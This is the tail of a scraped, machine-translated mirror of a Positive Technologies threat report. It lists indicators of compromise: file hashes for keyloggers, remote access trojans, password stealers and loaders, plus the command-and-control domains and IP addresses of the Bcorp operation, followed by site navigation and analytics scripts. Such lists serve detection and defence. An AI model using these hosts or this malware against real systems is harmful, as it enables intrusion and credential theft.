<br><br>  Start-keylogger <br>  55daa84475a11ea656183e0ad5ccc608 <br>  aa82fbb6a341d71d2431b6d2ebca027c <br><br>  WebBrowserPassView <br>  7722e086cf7ed59955a1d6ec26f49cf3 <br><br>  NetWire RAT <br>  1470a08bd427bb8738a254ba4f130ff5 <br>  5f8495016773c7834b1c588f0997a6c4 <br><br>  TCP Escuchar <br>  913567da98185cad9f91a570dc298de1 <br><br>  Cargadores de guiones <br>  02946d10c6a34fe74826f3c0b0a6a3e0 <br>  1ad644bdba488a6e42ad76aea2c0ee54 <br>  3a2dcf36b9206a135daa73c645a3f56f <br>  4dddd87d3cb80145c9859fd76dfef794 <br>  74c5e5be9f79bd9e7ee84fd046c14e68 <br>  78f4d5fa6c68dae4b03860b54ec6cc67 <br><br>  Minicargadores de pe <br>  0f3c56018a7051aebe060454fc981f5b <br>  1b9cefc229daddc4557cea0e3bdf4656 <br>  29e6679107bd9c72aa061371082206bb <br>  b66b7395825b9ed656b768d4e7fe1de7 <br>  fbc606b8b04e51ddb342e29b84ac1edb <br><br>  xRAT <br>  2e9a0637478938cc3e4519aa7b4219cc <br>  7c67c93ba243be32e5fd6a6921ceded3 <br><br>  Panel Bcorp vs.  constructor <br>  405c987ba1a8568e2808da2b06bc9047 <br>  c3ac8b7a7c8c0d100e3c2af8ccd11441 <br><br>  Bcorp C&amp;C <br>  bcorp.fun <br>  bkorp.xyz <br>  buhar.us <br>  definebilimi.com <br>  husan.ddns.net <br>  husan2.ddns.net <br>  husan3.ddns.net <br>  i36-imgur.com <br>  i37-imgur.com <br>  i38-imgur.com <br>  i39-imgur.com <br>  prntsrcn.com <br>  qqww.eu <br>  5.255.63.12 <br>  192.95.3.137 <br>  192.95.3.14 </div></div><br><br>  <b>Publicado por</b> Alexey Vishnyakov, Tecnolog√≠as positivas </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/479998/">https://habr.com/ru/post/479998/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../479978/index.html">Como sin dolor, sin captcha y sin cargo para llevar extractos del Fondo de Propiedad del Estado Federal del Registro Estatal Unificado de Derechos Humanos a un humano legible</a></li>
<li><a href="../479982/index.html">Vidos e insectos</a></li>
<li><a href="../479988/index.html">Concursos tecnol√≥gicos Radiofest-2019. Resumen</a></li>
<li><a href="../479992/index.html">C√≥mo ense√±ar a UITextView a destacarse maravillosamente</a></li>
<li><a href="../479996/index.html">Transistores de 2 nm: ¬øcorta o corta?</a></li>
<li><a href="../480000/index.html">Indicador de calidad del canal del servidor WebRTC sobre TCP</a></li>
<li><a href="../480002/index.html">Revise DevOpsDays Mosc√∫: ideas de 6 informes</a></li>
<li><a href="../480006/index.html">Indicador de calidad del canal para el servidor WebRTC sobre TCP</a></li>
<li><a href="../480008/index.html">Yuri Rogachev: "Vine a hacer el M-1, sin conocer la tecnolog√≠a inform√°tica"</a></li>
<li><a href="../480010/index.html">Los 3 principales elementos HTML que olvidamos</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>